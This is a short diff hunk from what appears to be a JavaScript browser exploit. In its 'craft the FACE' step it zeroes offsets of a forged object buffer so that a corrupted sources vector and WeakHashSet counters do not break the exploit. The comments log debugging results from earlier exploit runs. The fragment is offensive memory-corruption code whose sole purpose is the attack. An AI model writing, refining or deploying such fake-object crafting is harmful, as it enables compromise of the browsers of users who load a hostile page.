@@ -1033,6 +1033,15 @@ try{
       /* ---- STEP 3: craft the FACE ---- */
       bs('V29-FACE-CRAFT');
       for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
+      /* +0x48..0x57: the SOURCES VECTOR — poisoned by the read-carrier
+       * (G4 in the first run read 3f/65/0x824/46 = scan-grid garbage;
+       * m_sources.size() at +0x54 was 0x46 = 70 phantom sources!). MUST
+       * be zeroed so pump sees an empty vector. */
+      for(var sz2=0x48;sz2<=0x57;sz2++)hitBuf[sz2]=0;
+      /* +0x60..0x67: the WeakHashSet counters — also poisoned by the
+       * read-carrier (G3 read 0x8c00000055). Zero them in the FACE craft
+       * (runs after all readAt). */
+      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
       hitBuf[0x82]=0;                              /* status = Pending */
       hitBuf[0x83]=1;                              /* sourcesPopulated */
       hitBuf[0x87]=1;                              /* override = Block */
